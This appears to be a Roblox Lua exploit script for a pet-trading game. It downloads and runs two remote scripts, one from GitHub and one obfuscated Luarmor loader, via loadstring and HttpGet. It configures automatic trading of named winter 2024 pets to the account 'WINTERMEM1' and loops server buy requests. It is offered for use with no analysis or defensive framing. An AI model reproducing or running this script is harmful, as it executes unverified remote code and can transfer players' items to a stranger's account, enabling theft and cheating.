loadstring(game:HttpGet("https://raw.githubusercontent.com/Draculakemse/ss/refs/heads/main/manet.lua"))()
wait(10)
task.spawn(function()
    getgenv().Config = {
        ["inventory"] = "pets", -- Adapt to stickers, gifts, toys, pet_accessories, transport
        ["username"] = "WINTERMEM1",
        ["pets_to_trade"] = {"winter_2024_bauble_buddies", "winter_2024_ratatoskr"} -- or lures_2023_blazing_lion cant auto trade gifts with pet ONLY 1
    }
    getgenv().trade_status = true
    getgenv().pets_unique_ids = {}

    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5386bfa9bb03ae1da997e3078394366.lua"))()
end)

task.spawn(function()
    while true do task.wait(5)
        local args = {
            [1] = "pets",
            [2] = "winterfest_2024_bauble_buddies",
            [3] = {
                ["buy_count"] = 1
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
    end
end)
